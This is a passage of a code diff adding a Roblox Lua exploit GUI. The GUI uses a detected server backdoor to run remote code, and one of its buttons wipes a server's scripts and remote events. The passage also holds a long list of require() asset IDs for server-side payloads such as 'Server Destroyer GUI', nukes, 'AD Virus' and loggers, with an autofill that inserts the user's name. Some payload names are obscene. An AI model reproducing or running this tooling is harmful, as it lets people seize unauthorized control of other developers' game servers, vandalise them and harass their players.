+            for _, v in pairs(rs:GetDescendants()) do
+                if v:IsA("Script") or v:IsA("LocalScript") or v:IsA("ModuleScript") or
+                   v:IsA("RemoteEvent") or v:IsA("RemoteFunction") or
+                   v:IsA("BindableEvent") or v:IsA("BindableFunction") then
+                    pcall(function() v:Destroy() end)
+                end
+            end
+            for i = 1, 10 do
+                local f = Instance.new("Folder")
+                f.Name = "Cleaned by DevilBee"
+                f.Parent = ws
+            end
+            local h = Instance.new("Hint")
+            h.Text = "Server Cleaned"
+            h.Parent = ws
+        ]]
+        runRemote(backdoor, cleanScript)
+        GUI["Clean_Btn"].Text = "Cleaned!"
+        buttonClickEffect(GUI["Clean_Btn"])
+        task.wait(0.5)
+        GUI["Clean_Btn"].Text = "Clean Server"
+    else
+        GUI["Clean_Btn"].Text = "No Backdoor!"
+        task.wait(0.5)
+        GUI["Clean_Btn"].Text = "Clean Server"
+    end
+end)
+
+GUI["RequireHub_Btn"].MouseButton1Click:Connect(function()
+    GUI["RequireHub_Frame"].Visible = true
+end)
+
+GUI["RequireHub_Close"].MouseButton1Click:Connect(function()
+    GUI["RequireHub_Frame"].Visible = false
+end)
+
+GUI["AutoFill_Toggle"].MouseButton1Click:Connect(function()
+    autoFillEnabled = not autoFillEnabled
+    if autoFillEnabled then
+        GUI["AutoFill_Toggle"].Text = "Auto Fill Username: ON"
+        GUI["AutoFill_Toggle"].TextColor3 = Color3.fromRGB(100, 255, 100)
+    else
+        GUI["AutoFill_Toggle"].Text = "Auto Fill Username: OFF"
+        GUI["AutoFill_Toggle"].TextColor3 = Color3.fromRGB(255, 100, 100)
+    end
+end)
+
+local function applyAutoFill(scriptRaw)
+    if not autoFillEnabled then return scriptRaw end
+    local name = Players.LocalPlayer.Name
+    local s = scriptRaw
+    s = s:gsub("urnamehere", name)
+    s = s:gsub("YourName", name)
+    s = s:gsub("VictimName", name)
+    s = s:gsub('""', '"' .. name .. '"')
+    s = s:gsub("''", "'" .. name .. "'")
+    return s
+end
+
+local scriptsList = [[
+require(493711496)SH("")
+require(10868847330):pls("")
+require(10868847330):pls("YourName")
+require(5802346180).eliza(urnamehere) - EARRAPE
+require(7260532691)("urnamehere") - Huge Lord
+require(5802335492).eliza(urnamehere) - LOLOLOLOL
+require(4832967293):Fire("urnamehere") - NUKE GUI
+require(5610305900)("urnamehere") - TOPKEK V5
+require(4874364435)("urnamehere") - TOPKEK V4
+require(5034863407).subtosyntax64("urnamehere") - NOOT NOOT
+require(5115793531).scare(urnamehere) - Something From Spongebob
+require(5564800243).fehax("urnamehere") - CHATHAX
+require(5903403087).load("urnamehere") - IMPOSTER CHAT
+require(5617600468).load("urnamehere") - Neurotic
+require(5193737424)("urnamehere",true) - ULTRA NOOB SPAMMER
+require(1192815372).load'urnamehere' - RANDOM MAP
+require(5621190626).OmegaFlower("urnamehere") - OMEGA FLOWEY
+require(4106669917).load("urnamehere") - Chara Boss
+require(4483948796).load("urnamehere") - Pyro Flamethrower
+require(4581300009).xd("urnamehere") - RODA ROLLA DA
+require(4178274460).Nuke(Vector3.new(urnamehere),1000) - NUKE
+require(4564681456).catgirl(urnamehere) - CATGIRL TROLL
+require(4124996597).swano(urnamehere) - AD Virus
+require(4024051473).call("all") - Builderman Discord Call
+require(5257685661):Fire("urnamehere") - Server Destroyer GUI
+require(4937823608).load("urnamehere") - UTG
+require(4945821345).lmao("urnamehere") - UTG Epix
+require(5673170715).Leak("urnamehere") - Undetected Hub V2
+require(5099140412).Aqua("urnamehere") - Aqua Hub
+require(5492934148):Fire("XD","urnamehere") - Mr Bean Admin
+require(4863172339).Enduro("urnamehere") - Rape Gui
+require(5160216694).Ass("urnamehere") - Project Scripted GUI
+require(4937114966):SH("urnamehere") - Sakura Hub
+require(5516943300).Leak("urnamehere") - Undetected Hub V2
+require(4934614538):adrian("urnamehere") - Adrians Good UTG
+require(4977590940).load("urnamehere") - baldiinvasion2s utg
+require(5868025435).load("urnamehere") - D3S SS
+require(5028947792).Lmao("urnamehere") - Hoarder GUI
+require(5098731275).eliza("orangeado") - Epic Stand
+require(4902600443)("Stand Name", "urnamehere") - Jojo Stands
+require(5702333343).load("urnamehere") - Roz Hub
+require(5845339294).EH("urnamehere") - Ethereal Hub
+require(5128274968).GetAntsUtgV5("urnamehere") - Ants Hub V5
+require(4831353616).xh("urnamehere") - Xios Hub
+require(4634558715)("urnamehere") - Best Hub
+require(5356256564).SubscribeYouSkid("urnamehere") - Subhub
+require(5419240318).PraiseSkidGod("urnamehere") - Hexine Gui
+require(4829576129).SpringHub("urnamehere") - Spring Hub
+require(4706570992).load("urnamehere") - Unleaked SS
+require(5121570975).SpaghettiHub("urnamehere") - Spaghetti Hub
+require(5705720748).Lightning(string.reverse("urnamehere")) - Lightning Cannon
+require(5620645578):ASH("urnamehere") - Adrian Hub
+require(5580599015).load("urnamehere") - Avry Hub
+require(5098133040):FirePire("urnamehere:Pire") - Pire Hub
+require(5487274946).GLITCHED("urnamehere") - Glitchhub Premium
+require(5126648745).load("urnamehere") - Anonymous UTG
+require(4614455084).Under("urnamehere") - Under UTG
+require(5352721272):Fire("urnamehere") - Sonichub
+require(3497222070).load("urnamehere") - UTG Edit
+require(5828128589).honey(string.reverse("urnamehere")) - Zero Two Lightning Cannon
+require(5970690882).ps1("RICKLER") - Fearful Harmony
+require(5226367856).rk("urnamehere") - Super Cool Banisher
+require(4952179933).Fraud("urnamehere") - Fraud
+require(5963380437).publicbuild("urnamehere", "Retro") - Retro Hub
+require(6009547419).Fire("urnamehere") - Vascepa Hub
+require(5543125369).eliza("urnamehere") - Eliza Hub
+require(6062281254).load(urnamehere) - South Park Video Troll
+require(6036737823).CrackedByIncreaseron("imlucixD34") - Aureus V1
+require(6085762856).BINGBONG("NoNameNeeded") - Crab Rave
+require(5597042098).chinaAnnounce("urnamehere") - Xi Jinping
+require(3010581956):Fireplace("urnamehere") - Dark Dex
+require(4867426485):SD2("urnamehere") - Cooldown Nuke
+require(6088717643)("65464593") - Immortality Lord
+require(6123029966).vian("urnamehere") - Viankos
+require(5856873964).PharaohCannon(string.reverse("urnamehere")) - Pharaoh Lightning Cannon
+require(4658687827).nukes("urnamehere") - The End Nuke
+require(4555115496).gw("urnamehere") - Trollimbius Gui
+require(4154130567).ik("urnamehere") - Adrians UTG
+require(4967804765).SBV3("urnamehere") - Snake Banisher V3
+require(4903995654)(65464593) - Immortality Cannon
+require(4992512410):Asylumgotskidded("urnamehere") - Asylum Hub
+require(6114289913).c00lgui("urnamehere") - c00lgui remake
+require(5308680571).load("urnamehere") - GUI Hub
+require(4813227802){"urnamehere"} - PikaX UTG
+require(5146396793).load("urnamehere") - GodSpawn GUI
+require(5344766102).fare("urnamehere") - Fares Hubhub
+require(6097532439):redlightsdontleak("urnamehere") - Redlights.exe
+require(6099373575).load("urnamehere") - Ravenger Claws V2
+require(6222361140).load("urnamehere") - Shadow Gunner
+require(6027795939).load("urnamehere") - Cyber Monarch
+require(6099324864).load("urnamehere") - Kuma
+require(4471066396).load("urnamehere") - Bad Karma
+require(6175490752).load("urnamehere") - Void Boss
+require(6099241563).load("urnamehere") - Xester V2
+require(6099316092).load("urnamehere") - Veltex
+require(6058159336).load("urnamehere") - Shadow Kars
+require(6168743245).load("urnamehere") - The Defiant
+require(6099363076).load("urnamehere") - The Disturbed
+require(6042859321).load("urnamehere") - Jester
+require(6058166660).load("urnamehere") - Dimensiona
+require(4665394711).load("urnamehere") - Server Admin
+require(3224070083).load("urnamehere") - Nectula
+require(6088494183).load("urnamehere") - Desolate
+require(6015747481).load("urnamehere") - Brick Hamman
+require(5619264516).Dark("urnamehere") - Vaxtemi Boss Battle
+require(6056559552).load("urnamehere") - Death Sheriff
+require(6027832941).load("urnamehere") - Holy Hand Grenade
+require(5813743814).load("urnamehere") - Stick Beater
+require(5977500481).load("urnamehere") - Project Light
+require(5813695241).load("urnamehere") - Oculus
+require(5617200606).Cyber("urnamehere") - Cyber Knight
+require(5390158029).Dark("urnamehere") - Lost Soul
+require(5857033951).load("urnamehere") - Achromatic
+require(5813836873).load("urnamehere") - Archangel of Light
+require(5813799887).load("urnamehere") - Aureola
+require(4229413153).load("urnamehere") - Aether Lightning
+require(5751710030).Sun("urnamehere") - Deadly Laser Sun V3
+require(4611999946).load("urnamehere") - Sociopath
+require(4490557105).load("urnamehere") - Fallen Anger
+require(5068511197).insert("urnamehere") - Military Tank
+require(4661847142).load("urnamehere") - Chronos Sentinel
+require(5375460203).Player("urnamehere") - Glorious Bastion of Light
+require(5605396200):load("urnamehere","Felipe") - Felipes Ascension
+require(5374597845).Dark("urnamehere") - Echo
+require(5346891374).Dark("urnamehere") - Darkomos
+require(5270525643).Dark("urnamehere") - Stan
+require(4943481014).Nightmare("urnamehere") - Nightmare
+require(3256686965).load("urnamehere") - Dominus Venari
+require(5146659840).Dark_Eccentric("Dark_Eccentric", "urnamehere") - Grab Gun
+require(5239955586).Dark("urnamehere") - Siren Head
+require(5000363317).UwUMoment("urnamehere") - Kasper Hub
+require(4869378421).F3X("urnamehere") - F3X BTools
+require(5275752166).ULTRAV2("urnamehere") - Ultra Hub
+require(5178605206).bizzcrack("urnamehere") - Xio Hax
+require(5300095496).soap("urnamehere") - Soap Hub
+require(5142574517):mega("urnamehere") - Adrians MTG
+require(5203976741).spong("urnamehere") - Spong Hub
+require(5116049830).thonk("urnamehere") - Thonk Hub
+require(5253172143).load("urnamehere") - Forest hub
+require(5885462965).lexa("urnamehere") - L3xa Hub
+require(6216675632).ae("urnamehere") - Snake Glitcher
+require(6239870794):NB2("urnamehere") - NB Hub V2
+require(6253147982).SBV4("urnamehere") - Snake Banisher V4
+require(3024043748):Start("urnamehere","AAA") - Gear Stuff
+require(6234345495):Tesla("urnamehere") - Tesla Executor
+require(6269838898).load(urnamehere) - Operation Noob
+require(6171421519)("urnamehere") - Epic Godcat Edit
+require(6274987259).v2("urnamehere") - Project Scripted V2
+require(5994869968).D0ggo("urnamehere") - Luckys Hub
+require(4496865792).Lmao("urnamehere") - Ultimate Trolling Gui
+require(5716300544).asd("urnamehere") - Kaspers Hub
+require(5654587719).brohhh(string.reverse("urnamehere")) - Old Lightning Cannon
+require(4559977647).load("urnamehere") - Baseball Bat V5
+require(5742138267).Jimmy_Giovannas_burgers("urnamehere") - Poo Pee Stinky Hub
+require(5133347890).scrambles("urnamehere") - Scrambles Hub
+require(5098133040):FirePire("urnamehere:Pire") - Pire Logger
+require(6032524768).Eagle('urnamehere') - C00lgui Reborn
+require(6370978733)("urnamehere") - Lightning Cannon V2
+require(6270014162).load("urnamehere") - Universalis Dominus
+require(6419718698).load("urnamehere") - The Holiest Wrench
+require(6285853184).TimeStopper("urnamehere","rbc") - Time Stop
+require(6339079111).mobspawner("YourNameHere") - Minecraft Mobs Spawner
+require(6464428559).load("urnamehere") - Dominus Astra
+require(6438196691)("urnamehere","JUNKBOT") - Junkbot
+require(5813748809).load("urnamehere") - Light Circlet
+require(6424791174).load("urnamehere") - Gattai Zamasu
+require(6335063396).load("urnamehere") - Supr14 Nuke
+require(3032735551):Start("urnamehere","AAA") - Calamity
+require(6472943749).boss("urnamehere") - Bloxwatch
+require(6649537798).UniverseReset() - Universe Reset
+require(6564964464)("urnamehere") - Moriyan Drone
+require(6569726017)["urnamehere"] = "Dark"; - Hellset
+require(6540522165).load("urnamehere") - Omni God
+require(6218862474).eliza("urnamehere") - UTG V10
+require(5223007262)("VictimName") - Wario Apparition
+require(6525681614).reverser("urnamehere") - Reverse Time
+require(6707668066).virus("urnamehere") - Virus Ads
+require(6688474792).load("urnamehere") - Killbot V3
+require(1071722458).load("urnamehere") - Lightning Cannon UTG
+require(6794297504).NekoHub("urnamehere") - Neko Hub
+require(4081020916).loadmap() - Tanitive Space Map
+require(4081024299).loadmap() - Dungeon Map
+require(6746870700)() - Praise Server Destroyer
+require(6745275731)() - Nulled XD
+require(1463699117).Load("urnamehere") - Ultra God Lightning Cannon
+require(6287712657).Load("urnamehere") - Ultraskid Cannon
+require(3183152719)(game:GetService("Players"):WaitForChild("urnamehere").UserId) - Ultraskidded Lord
+require(7197738360)["UNKN0WN"]("urnamehere") - Unknown Lord
+require(6885716335)("urnamehere") - Ultraskidded Studio Dummy V2
+require(6788546558)("urnamehere") - Studio Dummy V3
+require(6824699886)("urnamehere") - Studio Dummy V3 Switcher
+require(7091286913)("urnamehere") - Newest Maddox Dummy
+require(6903927432)(65464593) - Anti V7
+require(7229827459).TotallyYessir23231212("urnamehere") - Legend Skidded Echo
+require(6522699963)("urnamehere") - Mat LC
+require(7054321111).SC("urnamehere") - Anatomiiii Cannon V.3
+require(6568426115)("urnamehere") - Rapid Fire Studio Dummy
+require(6931315732).yeah("urnamehere") - AndrFix Godcat Edit
+require(7242244455)("urnamehere") - Immortality Lord XTR
+require(7161308644).lc("urnamehere") - Shrike LC
+require(6608656220):John("urnamehere") - New John Doe
+require(7001260635).lctoolsreuploaded("urnamehere") - LC Tools Pack
+require(7037589092)("urnamehere") - Weird Lord
+require(7023682644)("urnamehere") - IL Dummy
+require(7242662591):SGH_3("urnamehere") - Sans_Gboards Hub
+require(7253448613)("urnamehere") - Studio Immortality Lord V2
+require(6799359169)("urnamehere") - Hyperskidded Lord
+require(6727030812).Fun("urnamehere", "Fun") - Tools Pack
+require(7203746402).tonk("urnamehere") - Tank AI
+require(7215403029).RRT("urnamehere") - Special Forces AI
+require(7185228601).load("urnamehere") - Helicopter AI
+require(7163976217).VK("urnamehere") - Police AI
+require(7486656912).Juggernaut("urnamehere") - Juggernaut AI
+require(3957090799).load("urnamehere") - Godspeed
+require(7414960182).load("urnamehere") - The Dark Entity
+require(7437496726).load("urnamehere") - Lucyanna Angel
+require(6888054758)(game:GetService("Players")["urnamehere"]) - Gregorian GUI
+require(7411835387) ("VictimNameHere") - The Time Machine
+require(7322088685)("urnamehere") - Immortality Demon
+require(6530368992).antilgr() - Anti ScriptLogger
+require(7276744247):noskids("urnamehere") - Logger Detector
+require(7485724079)(65464593) - Dark Skidded Lord
+require(7485376670).trussboy("urnamehere") - The Ascensionist
+require(7475656586).bscr("urnamehere") - Project Godcat
+require(7265631746):SGHR("urnamehere") - Sans_Gboard Hub Remake
+require(7064628940).TLX("urnamehere") - Tigers Lamborghini Type-X
+require(7380893117).HSBW("urnamehere") - Hyperskidded Bloodwater Edit
+require(7452827346):NEFFEXV2("urnamehere") - Neffex V2
+require(7077641377).SSB("urnamehere") - Super Skidded Banisher
+require(7103633176)("urnamehere") - Some Random Tool Pack
+require(6526438357).HSC("urnamehere") - Hyper Skidded Cannon XSE
+require(7594500378)("urnamehere") - Nightmare
+require(7593715162).load("urnamehere") - Calamity V3
+require(7593452166).exodim("urnamehere") - Exodim LC
+require(7601446307):SDIK("urnamehere") - Studio Immortality King
+require(7584808965).ImmortalityLord("urnamehere") - Incubus
+require(7575478789)["v1.6.1"]("urnamehere") - Hyper Skidded Godcat
+require(7141234250).molten("urnamehere") - Molten Banisher
+require(tonumber("7564007780")).e(string.reverse(string.reverse("urnamehere"))) - Ultraskidded Glitcher
+require(6710125107).mlem("urnamehere") - Mlems SS Gui V3
+require(6655953122).HopeV2iguess("urnamehere") - Hope V2
+require(7185139799).bal("urnamehere") - Maddox Ball Script
+require(7664181817)("urnamehere") - Bloodwater Edit
+require(7674895345)("urnamehere") - The Ascensionist 2
+require(7662310890)("urnamehere") - Ultraskidded Amongus
+require(7661712858).Load("urnamehere") - Ultraskidded Cannon X
+require(7691779364).hi("urnamehere") - Hallowed
+require(7701211784).rar("urnamehere") - Another Toolpack Script
+require(7580799842).NONAME("urnamehere") - Viewport Bloodwater
+require(7710841241).HoneyLCX("urnamehere") - Honey LC Overdrive
+require(7705282521).lc("urnamehere") - Shrike LC
+require(7146067831).katas({Player = "urnamehere", Skid=true}) - Katasrophe LC
+require(7133882046).Soul(string.reverse("urnamehere")) - Lost Cannon
+require(7722155314)("urnamehere") - Unknown Demon
+require(7703246385).NONAME("urnamehere") - New Viewport Bloodwater
+require(7078449501).MOTHERFUCKER("urnamehere") - UNKNOWN
+require(7759895257).Load("urnamehere") - Omega Skidded Cannon
+require(7781347277)("urnamehere") - Redone Ultraskidded Lord
+require(8065511782)("urnamehere") - Descensionist
+require(6740182305):myfirstscriptthatcankilllol("urnamehere") - Overpowered tool pack
+require(7819171999).antilgr() - Anti Logger V10
+require(6735691273).BetaAntiSkid() - Antiskid V10
+require(7628024907).LoadAdmin("urnamehere") - Anti V13
+]]
+
+local function populateList()
+    for _, child in ipairs(GUI["Scroll_Container"]:GetChildren()) do
+        if child:IsA("TextButton") then child:Destroy() end
+    end
+    
+    local lines = string.split(scriptsList, "\n")
+    for _, line in ipairs(lines) do
+        if line and line ~= "" then
+            local scriptCode = line
+            local scriptName = line
+            
+            local matchCode, matchName = line:match("^(.-)%s*-%-?%s*(.+)$")
+            if matchCode and matchName then
+                scriptCode = matchCode
+                scriptName = matchName
+            else
+                if #line > 30 then
+                    scriptName = line:sub(1, 27) .. "..."
+                end
+            end
+            
+            local btn = Instance.new("TextButton", GUI["Scroll_Container"])
+            btn.Size = UDim2.new(1, 0, 0, 30)
+            btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+            btn.Text = scriptName
+            btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            btn.TextSize = 14
+            btn.Font = Enum.Font.Gotham
+            
+            btn.MouseButton1Click:Connect(function()
+                local finalCode = applyAutoFill(scriptCode)
+                GUI["TextBox_32"].Text = finalCode
+                buttonClickEffect(btn)
+                createTween(GUI["TextBox_32"], {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}, 0.1)
+                task.wait(0.1)
+                createTween(GUI["TextBox_32"], {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.1)
+            end)
+            
+            local corner = Instance.new("UICorner", btn)
+            corner.CornerRadius = UDim.new(0, 4)
+        end
+    end
+    GUI["Scroll_Container"].CanvasSize = UDim2.new(0, 0, 0, GUI["ListLayout"].AbsoluteContentSize.Y + 10)
+end
+
+populateList()
+
+GUI["Close_3"].MouseButton1Click:Connect(function()
+    createTween(GUI["Frame_2"], {Size = UDim2.new(0,0,0,0), Position = UDim2.new(0.5,0,0.5,0)}, 0.3)
+    task.wait(0.3)
+    GUI["ScreenGui_1"]:Destroy()
+end)
+
+GUI["Close_15"].MouseButton1Click:Connect(function()
+    createTween(GUI["Frame_14"], {Size = UDim2.new(0,0,0,0), Position = UDim2.new(0.5,0,0.5,0)}, 0.3)
+    task.wait(0.3)
+    GUI["ScreenGui_13"]:Destroy()
+end)
+
+local function setupHoverEffects(button)
+    button.MouseEnter:Connect(function()
+        createTween(button, {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}, 0.2)
+    end)
+    button.MouseLeave:Connect(function()
+        createTween(button, {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
+    end)
+end
+
+setupHoverEffects(GUI["Scan_b"])
+setupHoverEffects(GUI["Exe_28"])
+setupHoverEffects(GUI["Clr_25"])
+setupHoverEffects(GUI["Sens_17"])
+setupHoverEffects(GUI["Clean_Btn"])
+setupHoverEffects(GUI["RequireHub_Btn"])
+setupHoverEffects(GUI["Copy_Btn"])
+
+GUI["Close_3"].MouseEnter:Connect(function()
+    createTween(GUI["Close_3"], {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
+end)
+GUI["Close_3"].MouseLeave:Connect(function()
+    createTween(GUI["Close_3"], {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
+end)
+GUI["Close_15"].MouseEnter:Connect(function()
+    createTween(GUI["Close_15"], {BackgroundColor3 = Color3.fromRGB(255, 50, 50)}, 0.2)
+end)
+GUI["Close_15"].MouseLeave:Connect(function()
+    createTween(GUI["Close_15"], {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.2)
+end)
+GUI["TextBox_32"].Focused:Connect(function()
+    createTween(GUI["TextBox_32"], {BackgroundTransparency = 0.4}, 0.2)
+end)
+GUI["TextBox_32"].FocusLost:Connect(function()
+    createTween(GUI["TextBox_32"], {BackgroundTransparency = 0.6}, 0.2)
+end)
+
+return GUI["ScreenGui_1"], require
